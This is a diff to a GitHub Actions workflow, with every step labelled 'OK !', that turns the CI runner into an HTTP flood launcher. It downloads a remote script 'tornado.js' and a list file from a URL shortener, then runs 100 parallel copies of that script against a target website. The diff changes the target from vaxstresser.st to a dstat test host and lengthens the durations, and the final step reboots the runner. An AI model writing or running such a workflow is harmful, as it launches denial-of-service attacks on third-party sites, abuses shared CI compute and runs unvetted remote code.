@@ -16,12 +16,12 @@ jobs:
       - name: OK !
         run: |
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
-          wget https://curl.by/2lW74/fres.txt
+          wget https://curl.by/6iTXe/fres.txt
           npm i hpack
           chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 60 node tornado.js GET https://vaxstresser.st/ 60 32 90 fres.txt --full --query 3
+            timeout 84 node tornado.js GET https://dstat.hexbear.xyz/ 80 32 90 fres.txt --full --query 3
             PIDS+=($!)
           done
           
@@ -30,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 60
+        run: sleep 84
         
       - name: OK !
         run: sudo reboot
